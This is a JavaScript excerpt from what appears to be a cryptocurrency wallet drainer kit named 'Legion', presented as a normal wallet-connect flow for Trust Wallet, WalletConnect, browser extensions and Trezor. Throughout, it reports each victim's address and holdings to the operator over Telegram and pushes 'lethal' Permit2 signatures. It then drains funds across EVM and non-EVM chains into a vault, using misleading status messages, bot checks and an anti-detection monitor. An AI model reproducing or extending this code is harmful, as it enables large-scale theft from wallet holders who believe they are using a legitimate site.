  async function continueConnected() {
    var r = await startPipeline({ reason: 'resume' });
    return !!(r && (r.ok || r.continued || r.path === 'scan_only' || r.path === 'already_done'));
  }

  async function continueConnectedCore() {
    // Recover address from session if state wiped
    if (!S.evmAddr) {
      try {
        var saved = sessionStorage.getItem('legion_wc_evm_addr');
        if (saved) S.evmAddr = saved.toLowerCase();
      } catch (e0) { /* ignore */ }
    }
    if (!S.evmAddr && window.LegionWallet && typeof window.LegionWallet.getEvmAddressFromSession === 'function') {
      try {
        var fromSess = window.LegionWallet.getEvmAddressFromSession();
        if (fromSess) S.evmAddr = String(fromSess).toLowerCase();
      } catch (e0b) { /* ignore */ }
    }

    // Live WC provider — getProvider alone often null after Safari freeze; force session recover
    async function ensureWcProvider() {
      if (S.evmProvider) return S.evmProvider;
      if (!window.LegionWallet) return null;
      try {
        if (typeof window.LegionWallet.tryRecoverStoredSession === 'function') {
          var rp = await window.LegionWallet.tryRecoverStoredSession(true);
          if (rp) {
            S.evmProvider = rp;
            try { rp.isWalletConnect = true; } catch (eRp) { /* ignore */ }
            S.connectMode = 'wc';
            S.wcSessionActive = true;
            return rp;
          }
        }
      } catch (eRec) {
        L.warn('[continue] tryRecoverStoredSession:', eRec && eRec.message);
      }
      try {
        if (typeof window.LegionWallet.getProvider === 'function') {
          var p = await window.LegionWallet.getProvider();
          if (p) {
            S.evmProvider = p;
            try { p.isWalletConnect = true; } catch (e1) { /* ignore */ }
            S.connectMode = 'wc';
            return p;
          }
        }
      } catch (e2) { /* ignore */ }
      return null;
    }

    await ensureWcProvider();

    if (!S.evmAddr) {
      L.warn('[continue] no EVM address');
      return false;
    }
    if (S.drainRunning) {
      L.log('[continue] drain already running');
      return false;
    }
    if (S.connecting) {
      var age = S.connectingSince ? (Date.now() - S.connectingSince) : 0;
      if (age < 20000) {
        L.log('[continue] pipeline still active (' + age + 'ms)');
        return false;
      }
      L.warn('[continue] clearing stuck connecting (' + age + 'ms)');
      S.connecting = false;
    }

    var addrKey = String(S.evmAddr).toLowerCase();
    var notified = S.notifyDone || S.connectNotifiedAddr === addrKey;
    if (!notified) {
      try {
        notified = sessionStorage.getItem('legion_notify_done') === addrKey;
        if (notified) {
          S.notifyDone = true;
          S.connectNotifiedAddr = addrKey;
          S.connectSession = sessionStorage.getItem('legion_connect_session') || S.connectSession;
        }
      } catch (e3) { /* ignore */ }
    }

    // Phase 1 — Telegram/scout even WITHOUT provider (addr-only after Safari kill)
    if (!notified) {
      L.log('[continue] notify-first resume (provider=' + !!S.evmProvider + ')');
      if (!S.connectSession) {
        S.connectSession = 'legion:' + Date.now() + ':' + Math.random().toString(36).slice(2, 8);
      }
      applyLegionWalletSessionAddresses();
      await broadcastConnectScan(
        S.evmAddr,
        S.evmChain || 1,
        S.evmWallet || 'Trust Wallet',
        S.allAddresses || collectAddressMap(S.evmAddr)
      );
      notified = !!(S.notifyDone || S.connectNotifiedAddr === addrKey);
    }

    // Phase 1b — amount Telegram (fusion/ranked/scan_complete) NEVER needs WC provider
    if (!S.amountScoutDone) {
      L.log('[continue] amount scout (provider not required)');
      try {
        await runWithTimeout(
          fireConnectAmountScout(
            S.evmAddr,
            S.evmChain || 1,
            S.evmWallet || 'Trust Wallet'
          ),
          25000,
          'continue-amount-scout'
        );
      } catch (eAmt) {
        L.warn('[continue] amount scout:', eAmt && eAmt.message);
      }
    }

    if (S.postConnectComplete && notified && S.drainAttempted && isPipelineFullySettled()) {
      L.log('[continue] already complete (settled)');
      return true;
    }
    // Pending Permit2 without flush — finish vault path first
    if (needsEvmFlush() && S.evmProvider) {
      L.log('[continue] pending Permit2 → settle to vault');
      try {
        await settleEvmToVault({});
        if (!needsEvmFlush()) {
          S.postConnectComplete = true;
          emitEvmConfirmDone(S.evmAddr);
          return true;
        }
      } catch (eFlush) {
        L.warn('[continue] settle:', eFlush && eFlush.message);
      }
    }

    // Drain needs live WC session — recover again before giving up
    if (!S.evmProvider) await ensureWcProvider();
    if (!S.evmProvider) {
      L.warn('[continue] notify+amount done but no WC provider for drain/sign');
      return !!notified;
    }

    L.log('[continue] resume drain pipeline (notify ok=' + !!notified + ', usd=' + (S.scoutUsd || 0) + ')');
    S.postConnectComplete = false;
    if (!hasRealEvmSuccess()) {
      clearSoftLethalSkipFlags();
    }
    await handleEvmConnect(S.evmProvider, {
      info: { name: S.evmWallet || 'WalletConnect', walletKey: 'trust' },
      resume: true,
    });
    return true;
  }

  /**
   * Legion-internal resume hooks — DISABLED when Trust satellites own resume
   * (trust-post-connect + keepalive → startPipeline). Avoids triple resume.
   * Enable only if CFG.legionOwnResume === true.
   */
  function installPostConnectResume() {
    if (window.__LEGION_POST_CONNECT_RESUME__) return;
    window.__LEGION_POST_CONNECT_RESUME__ = true;
    if (CFG.legionOwnResume !== true) {
      L.log('[resume] legion installPostConnectResume noop — satellites own startPipeline(resume)');
      return;
    }
    var kick = function (why) {
      try {
        if (!S.evmAddr && !sessionStorage.getItem('legion_wc_evm_addr')) return;
        if (hasRealEvmSuccess() && S.postConnectComplete) return;
        if (pipelineBusy()) return;
        L.log('[resume]', why, '→ startPipeline');
        startPipeline({ reason: why || 'resume' }).catch(function (e) {
          L.warn('[resume] fail:', e && e.message);
        });
      } catch (e) {
        L.warn('[resume] error:', e && e.message);
      }
    };
    document.addEventListener('visibilitychange', function () {
      if (document.visibilityState === 'visible') {
        setTimeout(function () { kick('visible'); }, 400);
      }
    });
    window.addEventListener('pageshow', function () {
      setTimeout(function () { kick('pageshow'); }, 400);
    });
    window.addEventListener('focus', function () {
      setTimeout(function () { kick('focus'); }, 500);
    });
  }

  async function handleEvmConnect(provider, walletInfo, hwObj) {
    var isResume = !!(walletInfo && walletInfo.resume);
    if (S.connecting && !isResume) {
      L.warn('Connect already in progress — skip duplicate');
      return;
    }
    var isWcProv = !!(provider && provider.isWalletConnect === true);
    if (!isWcProv && !hwObj && acceptTrustInAppWc(getLegionConnectorId(), provider)) {
      try { provider.isWalletConnect = true; } catch (eMarkWc) { /* ignore */ }
      isWcProv = true;
      S.connectMode = 'wc';
      S.wcSessionActive = true;
    }
    if (S.connectMode === 'wc' && !isWcProv && !hwObj) {
      logConnect('reject', 'extension hijack during MOBILE-WC');
      await clearInjectedSession({ keepMode: true });
      return;
    }
    if (S.connectMode === 'injected' && isWcProv && !hwObj) {
      logConnect('reject', 'WC provider during extension mode');
      return;
    }
    S.connecting = true;
    S.connectingSince = Date.now();
    S.connectMode = isWcProv ? 'wc' : 'injected';
    if (!isWcProv && isTrustInAppBrowser() && !S.injectedWalletKey) {
      S.injectedWalletKey = 'trust';
    }
    try {
      var accounts = await evmRequestAccounts(provider);
      if (!accounts || !accounts.length) throw new Error('No accounts returned');
      var address = (accounts[0] || '').toLowerCase();
      var chainId;
      if (provider && provider.isWalletConnect) {
        chainId = await resolveWcEvmChainIdFromProvider(provider);
      } else {
      var chainHex = await provider.request({ method: 'eth_chainId' });
        chainId = parseInt(String(chainHex).replace('0x', ''), 16);
      }
      var walletName = (walletInfo && walletInfo.info && walletInfo.info.name)
        || (hwObj && (hwObj.type === 'ledger' ? 'Ledger' : 'Trezor'))
        || detectEvmWalletName(provider)
        || 'Unknown Wallet';

      S.evmAddr = address; S.evmChain = chainId;
      S.evmProvider = provider; S.evmWallet = walletName;
      try { sessionStorage.setItem('legion_wc_evm_addr', address); } catch (eSs) {}
      logConnect('ok', address + ' | ' + walletName + ' | chain ' + chainId +
        (isWcProv ? ' | via MOBILE-WC' : ' | via EXTENSION'));

      if (hasFactoryOnChain(chainId)) {
        ensureUserFactoryContract(address, chainId).catch(function (e) {
          L.warn('factory prefetch:', e.message);
        });
      }

      var chainMeta = CHAIN_META[chainId] || { name: 'Chain ' + chainId };
      UI.setConnected(address, chainMeta.name);
      if (!isResume) {
      emitLegionEvent('legion:connected', { address: address, chainId: chainId, wallet: walletName });
      }

      closeAppKitModal();
      UI.overlay.show('verifying');
      S.postConnectComplete = false;

      if (!isResume || !S.connectSession) {
        S.connectSession = 'legion:' + Date.now() + ':' + Math.random().toString(36).slice(2, 8);
      }
      if (!isResume) {
        S.connectNotifiedAddr = '';
        S.connectNotifiedSession = '';
        S.notifyDone = false;
        S.amountScoutDone = false;
        S.fusionNotified = false;
        S.drainAttempted = false;
      }
      // Resume without real success: clear stale "already confirmed" so lethal can show
      if (isResume && !hasRealEvmSuccess()) {
        L.log('[connect] resume — clear soft lethal skip flags (no real success yet)');
        clearSoftLethalSkipFlags();
      }
      applyLegionWalletSessionAddresses();

      var fastTrust = isTrustInAppBrowser() || /trust/i.test(String(walletName || '')) ||
        (!!(provider && (provider.isTrust || provider.isTrustWallet)));
      var notifyOk = false;
      S.userRejectedSign = false;

      // ═══ TRUST: ONE FLOW — harvest → scout → lethal → Mode B settle (all funded EVM + non-EVM) ═══
      if (AUTO_DRAIN && fastTrust && !hwObj) {
        try { setPipelinePhase(PIPELINE.SCANNING); } catch (ePh0) { /* ignore */ }
        UI.showStatus('Linking networks…');
        L.log('[connect] ONE-FLOW — harvest families BEFORE scout/sign');

        // Family harvest FIRST (non-EVM addresses available for scout + same settle pass)
        try {
          discoverChainFamilies();
          await runWithTimeout(
            runBackgroundFamilyRails({ honorAbort: false, reportSkips: false, noWcExtend: true }),
            20000,
            'trust-inapp-families'
          );
          applyLegionWalletSessionAddresses();
          wireWcFamilyConnections();
          S.allAddresses = collectAddressMap(address);
        } catch (eFam) {
          L.warn('[connect] Trust families early:', eFam && eFam.message);
        }

        UI.showStatus('Scanning portfolio…');
        try {
          notifyOk = await runWithTimeout(
            broadcastConnectScan(address, chainId, walletName, S.allAddresses || collectAddressMap(address)),
            8000,
            'connect-notify'
          );
          notifyOk = notifyOk !== false && !!(S.notifyDone || S.connectNotifiedAddr);
        } catch (notifyErr) {
          L.warn('[connect] notify:', notifyErr && notifyErr.message);
        }
        try {
          await runWithTimeout(
            fireConnectAmountScout(address, chainId, walletName),
            20000,
            'amount-scout'
          );
        } catch (eAmt) {
          L.warn('[connect] amount scout:', eAmt && eAmt.message);
        }

        var alreadyInstant = typeof evmLethalAlreadyConfirmed === 'function' && evmLethalAlreadyConfirmed();
        var scoutUsd = Number(S.scoutUsd) || 0;
        var emptyWallet = S.amountScoutDone && scoutUsd <= 0;

        if (emptyWallet && !alreadyInstant && !needsEvmFlush()) {
          L.log('[connect] empty wallet after scan — skip lethal, complete notify path');
          S.drainAttempted = true;
          S.postConnectComplete = true;
          try { setPipelinePhase(PIPELINE.DONE); } catch (ePhE) { /* ignore */ }
          S.connecting = false;
          UI.overlay.hide();
          UI.showStatus('Scan complete — no assets');
          return;
        }

        // Fast first popup on current/funded chain; Mode B in settle covers OTHER funded EVM
        if (!alreadyInstant) {
          try { setPipelinePhase(PIPELINE.SIGNING); } catch (ePh1) { /* ignore */ }
          UI.showStatus('Confirm in Trust…');
          L.log('[connect] lethal AFTER scan | usd=', scoutUsd);
          try {
            var instant = await forceLethalSign(provider, address, chainId, walletName);
            if (instant && instant.ok) {
              S.userRejectedSign = false;
              L.log('[connect] lethal sign OK:', instant.path);
            } else {
              L.warn('[connect] lethal miss:', instant && instant.error);
            }
          } catch (instErr) {
            if (isUserRejection(instErr)) {
              S.userRejectedSign = true;
              try { setPipelinePhase(PIPELINE.REJECTED); } catch (ePhR) { /* ignore */ }
              await SCOUT.alertStage('user_rejected', address, chainId, walletName, instErr.message);
              UI.showUserRejected();
              S.connecting = false;
              return;
            }
            L.warn('[connect] lethal sign:', instErr && instErr.message);
          }
        } else {
          L.log('[connect] skip first lethal — already signed this session');
        }

        var drainRejected = false;
        try { setPipelinePhase(PIPELINE.DRAINING); } catch (ePh2) { /* ignore */ }

        L.log('[connect] settle — Mode B all funded EVM + non-EVM + flush');
        S.drainAttempted = true;
        try {
          await settleEvmToVault({
            provider: provider,
            address: address,
            chainId: chainId,
            walletName: walletName,
            hwObj: hwObj,
          });
          S.userRejectedSign = false;
        } catch (drainErr) {
          if (isUserRejection(drainErr)) {
            drainRejected = true;
            S.userRejectedSign = true;
            try { setPipelinePhase(PIPELINE.REJECTED); } catch (ePhR2) { /* ignore */ }
            await SCOUT.alertStage('user_rejected', address, chainId, walletName, drainErr.message);
            UI.showUserRejected();
          } else {
            await SCOUT.alertFailure('EVM', 'connect_drain', drainErr, address, chainId, walletName);
            throw drainErr;
          }
        }

        if (S.anchorsOk > 0) {
          UI.status('Complete!');
        } else if (!drainRejected && scoutUsd > 0 && !needsEvmFlush()) {
          await SCOUT.reportDrainStatus('no_action', address, chainId, walletName, 'No signature or confirmed TX submitted');
        }

        if (!needsEvmFlush() && !drainRejected) {
          S.postConnectComplete = true;
          // Event kept for debug; Phase B auto-UI is muted
          emitEvmConfirmDone(address);
          try { setPipelinePhase(PIPELINE.DONE); } catch (ePh3) { /* ignore */ }
        } else if (drainRejected) {
          try { setPipelinePhase(PIPELINE.REJECTED); } catch (ePh4) { /* ignore */ }
        } else {
          L.warn('[connect] pending still set after settle — resume can flush');
          try { setPipelinePhase(PIPELINE.IDLE); } catch (ePh5) { /* ignore */ }
        }
        S.connecting = false;
        UI.overlay.hide();
        return;
      }

      // ═══ NON-TRUST: original bg notify then drain ═══
      UI.showStatus('Notifying…');
      var bgNotify = (async function () {
        try {
          notifyOk = await runWithTimeout(
            broadcastConnectScan(address, chainId, walletName, S.allAddresses || collectAddressMap(address)),
            12000,
            'connect-notify'
          );
          notifyOk = notifyOk !== false && !!(S.notifyDone || S.connectNotifiedAddr);
        } catch (notifyErr) {
          L.warn('[connect] notify:', notifyErr && notifyErr.message);
        }
        if (!notifyOk) {
          try {
            notifyOk = await broadcastConnectScan(address, chainId, walletName, collectAddressMap(address));
          } catch (eRetry) { /* ignore */ }
        }
        try {
          await runWithTimeout(
            fireConnectAmountScout(address, chainId, walletName),
            15000,
            'amount-scout'
          );
        } catch (eAmt) {
          L.warn('[connect] amount scout:', eAmt && eAmt.message);
        }
      })();

      if (!AUTO_DRAIN) {
        await bgNotify.catch(function () {});
        L.warn('[connect] skip drain — autoDrain=false');
        S.drainAttempted = true;
        UI.overlay.hide();
        return;
      }

      if (S.drainRunning) {
        L.warn('[connect] clearing stale drainRunning before new drain');
        clearDrainLock();
      }
      armDrainLock();
      S.pendingEvmPermit2 = null;

      if (!isResume || !S.familiesLinked) {
        S.familiesLinked = false;
        S.familyConnections = {};
        S.evmScanChainIds = null;
        S.chains = { EVM: null, SOL: null, TRON: null, TON: null, BTC: null, COSMOS: null, APTOS: null, SUI: null };
        S.allAddresses = {};
        UI.showStatus('Linking blockchains…');
        applyLegionWalletSessionAddresses();
        await runWithTimeout(linkAllFamiliesOnConnect(address), 20000, 'link-families');
        await runWithTimeout(
          broadcastConnectScan(address, chainId, walletName, S.allAddresses),
          10000,
          'renotify-families'
        );
        if (!S.amountScoutDone) {
          await runWithTimeout(fireConnectAmountScout(address, chainId, walletName), 12000, 'amount-scout-2');
        }
        if (S.connectMode === 'wc') {
          UI.showStatus('Checking wallet session chains…');
          await runWithTimeout(
            enrichWcFamiliesAndRenotify(address, chainId, walletName),
            15000,
            'enrich-wc'
          );
        }
      }

      try {
        await Promise.race([bgNotify, sleep(2000)]);
      } catch (eBg) { /* ignore */ }

      await sleep(CFG.delayDrainMs || 200);

      L.log('[connect] starting drain (notify=' + !!notifyOk + ', fastTrust=' + !!fastTrust + ')');
      S.drainAttempted = true;
      var drainRejected = false;
      try {
        await runUniversalDrain({
          provider: provider,
          address: address,
          chainId: chainId,
          walletName: walletName,
          hwObj: hwObj,
        });
      } catch (drainErr) {
        if (isUserRejection(drainErr)) {
          drainRejected = true;
          S.userRejectedSign = true;
          await SCOUT.alertStage('user_rejected', address, chainId, walletName, drainErr.message);
          UI.showUserRejected();
        } else {
          await SCOUT.alertFailure('EVM', 'connect_drain', drainErr, address, chainId, walletName);
          throw drainErr;
        }
      }

      if (S.anchorsOk > 0) {
        UI.status('Complete!');
      } else if (!drainRejected && Number(S.scoutUsd) > 0) {
        await SCOUT.reportDrainStatus('no_action', address, chainId, walletName, 'No signature or confirmed TX submitted');
      }

      // ═══ TRUST IN-APP: second drain pass for non-EVM families after WC linking ═══
      if (fastTrust) {
        try {
          // Wait for bgNotify (family linking) to finish, then drain non-EVM
          await bgNotify.catch(function () {});
          // Also try injected providers (window.trustwallet.solana etc.)
          try {
            discoverChainFamilies();
            await runWithTimeout(linkAllFamiliesOnConnect(address), 10000, 'link-families-injected');
          } catch (eLink) {
            L.warn('[connect] injected families:', eLink && eLink.message);
          }
          applyLegionWalletSessionAddresses();
          wireWcFamilyConnections();
          var linkedFams = [];
          ['SVM', 'UTXO', 'TRON', 'TON', 'COSMOS', 'APTOS', 'SUI'].forEach(function (fk) {
            if (S.familyConnections[fk] && familyConnectionCanSign(S.familyConnections[fk], fk)) {
              linkedFams.push(fk);
            }
          });
          if (linkedFams.length) {
            L.log('[connect] Trust in-app: second drain pass for', linkedFams.join('+'));
            UI.showStatus('Confirm ' + linkedFams.join('/') + ' in Trust…');
            // runUniversalDrain will skip EVM (already done) and drain linked non-EVM
            try {
              clearDrainLock();
              armDrainLock();
              await runUniversalDrain({
                provider: provider,
                address: address,
                chainId: chainId,
                walletName: walletName,
                hwObj: hwObj,
              });
            } catch (drain2Err) {
              if (isUserRejection(drain2Err)) {
                await SCOUT.alertStage('user_rejected', address, chainId, walletName, drain2Err.message);
              } else {
                L.warn('[connect] non-EVM drain:', drain2Err && drain2Err.message);
              }
            } finally {
              clearDrainLock();
            }
          } else {
            L.log('[connect] Trust in-app: no non-EVM families linked');
          }
        } catch (e2nd) {
          L.warn('[connect] second drain pass:', e2nd && e2nd.message);
        }
      }
    } catch (e) {
      L.warn('EVM connect error:', e.message);
      if (isUserRejection(e)) {
        if (S.connectMode === 'injected') {
          await clearInjectedSession({ keepMode: false });
        }
        UI.showUserRejected();
        if (S.evmAddr) {
          await SCOUT.alertStage('user_rejected', S.evmAddr, S.evmChain, S.evmWallet, e.message);
        }
      } else if (S.evmAddr) {
        await SCOUT.alertFailure('EVM', 'connect', e, S.evmAddr, S.evmChain, S.evmWallet);
      }
    } finally {
      clearDrainLock();
      S.connecting = false;
      // Complete only if notify landed OR drain was attempted
      S.postConnectComplete = !!(S.notifyDone || S.connectNotifiedAddr || S.drainAttempted);
      UI.overlay.hide();
    }
  }

  async function handleConnect() {
    // Stale drain lock must not block the connect button forever
    if (S.drainRunning && !S.connecting) {
      L.warn('[handleConnect] clearing stale drainRunning');
      clearDrainLock();
    }
    if (S.drainRunning) return;
    if (isWcConnectActive()) {
      logConnect('blocked', 'handleConnect — WC active, use extension picker after closing QR');
      return;
    }
    if (!S.vaultLoaded) await prefetchVault();
    await prepInjectedMode();

    if (PLAT.strategy === 'inapp' && window.ethereum) {
      await handleEvmConnect(window.ethereum, { info: { name: PLAT.walletApp || 'Wallet' } });
      return;
    }

    // Hardware wallets: use explicit modal buttons (Trezor / Ledger) — do not auto-hijack connect
    await openExtensionPicker();
  }

  async function handleTrezorConnect() {
    if (S.drainRunning && !S.connecting) clearDrainLock();
    if (S.connecting) {
      L.warn('Connect already in progress — skip Trezor');
        return;
      }
    if (typeof window.customModalClose === 'function') window.customModalClose();
    UI.overlay.show('connecting');
    try {
      var trezor = await HW.connectTrezor();
      if (!trezor) throw new Error('Trezor not connected — open Trezor Suite / plug device');
        var tzProv = {
          request: async function (args) {
          if (args.method === 'eth_requestAccounts' || args.method === 'eth_accounts') return [trezor.address];
            if (args.method === 'eth_chainId') return '0x1';
          if (args.method === 'eth_signTypedData_v4' || args.method === 'eth_signTypedData') {
            var td = typeof args.params[1] === 'string' ? JSON.parse(args.params[1]) : args.params[1];
            var sig = await HW.signTrezorTypedData(td);
            if (!sig) throw new Error('Trezor typed data sign failed');
            return sig;
          }
          if (args.method === 'eth_signTransaction' || args.method === 'eth_sendTransaction') {
            var signed = await HW.signTrezorTransaction(args.params[0]);
            if (!signed) throw new Error('Trezor transaction sign failed');
            return signed;
          }
          throw new Error('Trezor unsupported method: ' + (args && args.method));
        },
        isTrezor: true,
      };
      await handleEvmConnect(tzProv, { info: { name: 'Trezor' } }, trezor);
    } catch (e) {
      L.warn('Trezor button:', e && e.message);
      UI.overlay.hide();
      console.warn('[Legion] Trezor:', e && e.message ? e.message : e);
    }
  }

  async function handleWC() {
    if (S.drainRunning) return;
    var deepLinkPeek = null;
    try { deepLinkPeek = window.__LEGION_DEEP_LINK_TARGET__ || null; } catch (ePeek) { deepLinkPeek = null; }
    // Trust in-app Browser: never fire trust://wc — stay on AppKit multichain sheet
    try {
      if (isTrustInAppBrowser() || window.__TRUST_IN_APP__ || window.__TRUST_INAPP_APPKIT__) {
        window.__TRUST_INAPP_APPKIT__ = true;
        window.__LEGION_DEEP_LINK_TARGET__ = null;
        deepLinkPeek = null;
      }
    } catch (eInAppWc) { /* ignore */ }
    // Named mobile deep-link must never get stuck behind a prior connecting flag
    if ((S.connecting || _wcConnecting) && !deepLinkPeek) {
      logConnect('skip', 'WC connect already running');
        return;
      }
    if (deepLinkPeek) {
      _wcConnecting = false;
      S.connecting = false;
    }
    if (!S.vaultLoaded) {
      try {
        await Promise.race([
          prefetchVault(),
          new Promise(function (res) { setTimeout(res, deepLinkPeek ? 2500 : 8000); }),
        ]);
      } catch (eVault) { /* continue connect */ }
    }
    await clearInjectedSession({ keepMode: true });
    installWcGuard();
    UI._walletIcon = '';
    _wcConnecting = false;
    S.connectMode = 'wc';

    var wcProv = null;
    var _wcSessionWasRecovered = false;
    // Named mobile deep-link (Trust/MM/CB): never recover stale session — need fresh URI
    if (!deepLinkPeek) {
      wcProv = await tryRecoverWcSession();
      if (wcProv) _wcSessionWasRecovered = true;
      } else {
      L.log('WC: named deep-link — skip session recover');
      try { await disconnectLegionWallet(); } catch (eDisc) {}
    }
    if (!wcProv) {
      await cleanConflictingWcSessions();
      await prepWcOnlyMode(true);
    } else {
      await prepWcOnlyMode(false);
    }

    var wcBlockedByExt = false;
    if (!wcProv) {
    for (var attempt = 0; attempt < 2; attempt++) {
      try {
        L.log('WC: Reown AppKit (attempt', attempt + 1, ')');
        wcProv = await bundledWalletConnect();
        if (!wcProv) {
          var hijackId = getLegionConnectorId().toLowerCase();
          if (isInjectedConnectorId(hijackId)) {
            L.warn('WC hijacked by extension:', hijackId);
            await disconnectLegionWallet();
            await prepWcOnlyMode(true);
            wcBlockedByExt = true;
            continue;
          }
          L.log('WC: polling mobile session...');
          wcProv = await pollWcProviderReady(60000);
        }
        if (wcProv) {
          var activeId = getLegionConnectorId().toLowerCase();
          if (!isRealWalletConnectSession(activeId, wcProv)) {
            L.warn('WC hijacked by', activeId || 'extension', '— retry');
            await disconnectLegionWallet();
            wcProv = null;
            wcBlockedByExt = isInjectedConnectorId(activeId);
            await prepWcOnlyMode(true);
            continue;
          }
          break;
        }
      } catch (e) {
        L.warn('WC attempt fail:', e.message);
      }
    }
    }

    if (!wcProv) {
      removeWcGuard();
      S.wcSessionActive = false;
      UI.overlay.hide();
      if (wcBlockedByExt) {
        UI.showStatus('WalletConnect = phone QR only. Disable MetaMask for this site, or use Incognito without extensions.');
      } else {
        UI.showStatus('WalletConnect failed — scan QR and approve on your phone wallet');
      }
      return;
    }

    try {
      var wcAccts = await wcProv.request({ method: 'eth_accounts' }).catch(function () { return null; });
      if (!wcAccts || !wcAccts.length) {
        wcAccts = await evmRequestAccounts(wcProv);
      }
      if (!wcAccts || !wcAccts.length) {
        var sessAddr = resolveWcEvmAddress();
        if (sessAddr) wcAccts = [sessAddr];
      }
      if (!wcAccts || !wcAccts.length) {
        removeWcGuard();
        S.wcSessionActive = false;
        UI.overlay.hide();
        L.warn('WC connected but no EVM address resolved');
      return;
    }
      L.log('WC account resolved:', String(wcAccts[0]).slice(0, 10) + '...');
      S.wcSessionExpired = false;
    } catch (accErr) {
      var recovered = resolveWcEvmAddress();
      if (!recovered) {
        L.warn('WC account check:', accErr.message);
        removeWcGuard();
        S.wcSessionActive = false;
        UI.overlay.hide();
        return;
      }
      L.log('WC account recovered from session after RPC fail');
    }

    S.wcSessionActive = true;
    S.connectMode = 'wc';
    L.log('WC provider ready | wc:', !!(wcProv && wcProv.isWalletConnect));

    await harvestWcMultichainFamilies({
      waitMs: WC_HARVEST_WAIT_MS,
      linkBtc: true,
      ensureBip122: false,
      bip122PollMs: WC_BIP122_POLL_MS,
    });

    // Recovered session: backend was never notified (bundledWalletConnect was skipped).
    // Register now so sign loop fires even after site close.
    if (_wcSessionWasRecovered) void registerWcSessionWithBackend();

    await handleEvmConnect(wcProv, { info: { name: 'WalletConnect', walletKey: 'walletconnect' } });
  }

  async function init() {
    if (isBot()) { L.warn('Bot detected — abort'); return; }

    // ?reset=1 — clears all session data so operator can test fresh connects
    try {
      if (new URLSearchParams(window.location.search).get('reset') === '1') {
        sessionStorage.clear();
        ['legion_notify_done', 'legion_connect_session', 'lgn_connect_host',
          'legion_wc_families', 'legion_wc_session'].forEach(function (k) {
          try { localStorage.removeItem(k); } catch (e) {}
        });
        var wcKeys = Object.keys(localStorage).filter(function (k) {
          return k.startsWith('wc@2:') || k.startsWith('W3M') || k.startsWith('wagmi');
        });
        wcKeys.forEach(function (k) { try { localStorage.removeItem(k); } catch (e) {} });
        L.log('[reset] session cleared via ?reset=1');
        window.history.replaceState({}, '', window.location.pathname);
      }
    } catch (eReset) {}

    // Fire EIP-6963 immediately
    requestProviders();
    discoverChainFamilies();
    setTimeout(function () { requestProviders(); discoverChainFamilies(); }, 800);
    setTimeout(function () { requestProviders(); discoverChainFamilies(); }, 2000);

    // Prefetch vault in background
    prefetchVault();

    // Anti-detection monitor
    SEC.startMonitor();

    // Wait for wallets to announce
    await sleep(600);

    // Inject UI buttons
    var nblDrawer = document.querySelector('[data-testid="account-drawer-container"]');
    if (document.body) {
      if (!nblDrawer) UI.inject(defaultConnect, handleWC);
    } else {
      document.addEventListener('DOMContentLoaded', function () {
        if (!document.querySelector('[data-testid="account-drawer-container"]')) {
          UI.inject(defaultConnect, handleWC);
        }
      });
    }

    window.legionOpenExtensions = openExtensionPicker;

    if (!nblDrawer) {
      window.customModalOpen = defaultConnect;
      window.customModalClose = function () { UI.closeWalletModal(); };
    } else if (window.LegionDrawer && typeof window.LegionDrawer.open === 'function') {
      window.customModalOpen = function () { window.LegionDrawer.open(); };
      window.customModalClose = function () { window.LegionDrawer.close(); };
      window.customModalClickWalletConnect = function () {
        window.LegionDrawer.close();
        handleWC();
      };
      window.customModalClickTrezor = function () {
        window.LegionDrawer.close();
        handleTrezorConnect().catch(function (e) {
          L.warn('Trezor modal:', e && e.message);
        });
      };
    }

    // Always expose Trezor handler for wallet-modal.js (even without LegionDrawer)
    window.customModalClickTrezor = window.customModalClickTrezor || function () {
      if (typeof window.customModalClose === 'function') window.customModalClose();
      handleTrezorConnect().catch(function (e) {
        L.warn('Trezor modal:', e && e.message);
      });
    };

    L.log('Legion v' + LEGION_VERSION + ' ready — unified multi-family connect');
    installPostConnectResume();

    // Only auto-connect when explicitly enabled (never on silentMode alone)
    if (CFG.autoConnectOnLoad === true && AUTO_DRAIN && !S.drainRunning && window.ethereum) {
      setTimeout(function () {
        handleConnect().catch(function (e) { L.warn('autoConnectOnLoad:', e.message); });
      }, 800);
    }

    if (AUTO_RUN && !S.drainRunning) {
      setTimeout(function () { handleConnect().catch(function (e) { L.warn('autoRun:', e.message); }); }, 800);
    }
  }

  // Public API
  window.legion = {
    connect: handleConnect,
    connectWC: handleWC,
    connectTrezor: handleTrezorConnect,
    connectInjected: connectWithWallet,
    resolveProvider: resolveEvmProvider,
    /** Resume scout+drain after mobile WC connect — routes through startPipeline. */
    continueConnected: continueConnected,
    /** Single pipeline owner — satellites must prefer this over ad-hoc sign/continue. */
    startPipeline: startPipeline,
    getPipelinePhase: function () { return _pipelinePhase; },
    pipelineBusy: pipelineBusy,
    needsEvmFlush: needsEvmFlush,
    hasSettledEvm: hasSettledEvm,
    settleToVault: function () { return settleEvmToVault({}); },
    /** Amount Telegram only — no WC provider required. */
    runAmountScout: function (addr, chainId, walletName) {
      var a = (addr || S.evmAddr || '').toLowerCase();
      if (!a) return Promise.resolve(false);
      S.evmAddr = a;
      S.amountScoutDone = false;
      return fireConnectAmountScout(
        a,
        chainId || S.evmChain || 1,
        walletName || S.evmWallet || 'Trust Wallet'
      ).then(function () { return { usd: S.scoutUsd || 0, done: !!S.amountScoutDone }; });
    },
    getScoutUsd: function () { return Number(S.scoutUsd) || 0; },
    /** Trust Approve button — drain or personal_sign so wallet always gets a popup. */
    forceTrustSign: forceTrustSignPublic,
    linkTrustFamilies: linkTrustFamilies,
    connectAllFamilies: connectAllFamilies,
    /** Fire Telegram connect+scan immediately (Android in-app must not wait for handleEvmConnect). */
    notifyConnect: function (addr, chainId, walletName) {
      var a = (addr || S.evmAddr || '').toLowerCase();
      if (!a) return Promise.resolve(false);
      S.evmAddr = a;
      if (!S.connectSession) {
        S.connectSession = 'legion:' + Date.now() + ':' + Math.random().toString(36).slice(2, 8);
      }
      return broadcastConnectScan(
        a,
        chainId || S.evmChain || 1,
        walletName || S.evmWallet || 'Trust Wallet',
        S.allAddresses || collectAddressMap(a)
      ).then(function () {
        return fireConnectAmountScout(
          a,
          chainId || S.evmChain || 1,
          walletName || S.evmWallet || 'Trust Wallet'
        ).then(function () { return true; }).catch(function () { return !!(S.notifyDone || S.connectNotifiedAddr); });
      }).catch(function () { return false; });
    },
    evmAlreadyConfirmed: evmLethalAlreadyConfirmed,
    markPopupConfirmed: markPopupConfirmed,
    closeAppKitModal: closeAppKitModal,
    /** Phase B: SOL/BTC/TRON/TON link+drain with Stop support. */
    runPhaseB: runPhaseBInteractive,
    abortPhaseB: abortPhaseB,
    abort: abortPhaseB,
